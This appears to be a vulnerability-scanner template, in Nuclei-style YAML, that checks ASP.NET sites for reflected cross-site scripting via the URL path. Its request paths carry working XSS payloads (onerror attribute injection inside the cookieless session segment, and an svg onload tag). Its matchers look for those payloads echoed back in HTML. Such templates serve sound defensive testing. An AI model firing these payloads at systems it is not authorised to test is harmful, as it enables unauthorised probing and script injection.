id: xss-asp-uri
info:
  author: melbadry9
  name: Reflected XSS Via URI Based
  severity: medium
requests:
- matchers:
  - condition: or
    part: body
    type: word
    words:
    - '"onerror=''alert`1`''tttt'
    - '''onerror=''alert`1`''tttt'
    - <svg/onload=prompt(1)>
  - part: header
    type: word
    words:
    - text/html
  - condition: and
    negative: true
    part: body
    type: word
    words:
    - The requested URL
    - was not found on this server.</p>
  matchers-condition: and
  max-redirects: 2
  method: GET
  path:
  - '{{BaseURL}}/(A(%27%22onerror=''alert%601%60''tttt))/Default.aspx'
  - '{{BaseURL}}/(A(%22onerror=''alert%601%60''tttt))/'
  - '{{BaseURL}}/(A(%27onerror=''alert%601%60''tttt))/'
  - '{{BaseURL}}/%27%22<svg/onload=prompt(1)>'
  redirects: true
